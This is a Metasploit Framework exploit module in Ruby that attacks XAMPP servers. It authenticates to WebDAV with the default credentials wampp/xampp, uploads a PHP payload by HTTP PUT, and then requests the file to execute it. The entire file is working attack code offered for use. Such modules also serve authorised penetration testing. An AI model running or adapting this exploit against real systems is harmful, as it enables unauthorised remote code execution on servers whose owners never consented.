##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize
		super(
			'Name'        => 'XAMPP WebDAV PHP Upload',
			'Description'    => %q{
					This module exploits weak WebDAV passwords on XAMPP servers.
					It uses supplied credentials to upload a PHP payload and 
					execute it.
			},
			'Author'      => ['thelightcosine <thelightcosine[at]metasploit.com'],
			'Version'     => '$Revision$',
			'Platform'    => 'php',
			'Arch'        => ARCH_PHP,
			'Targets'     =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0
		)

		register_options(
			[
				OptString.new('PATH', [ true,  "The path to attempt to upload", '/webdav/']),
				OptString.new('FILENAME', [ false ,  "The filename to give the payload. (Leave Blank for Random)"]),
				OptString.new('RUSER', [ true,  "The Username to use for Authentication", 'wampp']),
				OptString.new('RPASS', [ true,  "The Password to use for Authentication", 'xampp'])
			], self.class)
	end



	def exploit
		uri = build_path
		print_status "Uploading Payload to #{uri}"
		res,c = send_digest_request_cgi({
					'uri'     => uri,
					'method'  => 'PUT',
					'data'	=> payload.raw,
					'DigestAuthUser' => datastore['RUSER'],
					'DigestAuthPassword' => datastore['RPASS']
				}, 25)
		unless (res.code == 201)
			print_error "Failed to upload file!"
			return
		end
		print_status "Attempting to execute Payload"
		res = send_request_cgi({
			'uri'          =>  uri,
			'method'       => 'GET'
		}, 20)
	end



	def build_path
		if datastore['PATH'][0,1] == '/'
			uri_path = datastore['PATH'].dup
		else
			uri_path = '/' + datastore['PATH'].dup
		end
		uri_path << '/' unless uri_path.ends_with?('/')
		if datastore['FILENAME']
			uri_path << datastore['FILENAME']
			uri_path << '.php' unless uri_path.ends_with?('.php')
		else
			uri_path << Rex::Text.rand_text_alphanumeric(7)
			uri_path << '.php'
		end
		return uri_path
	end

end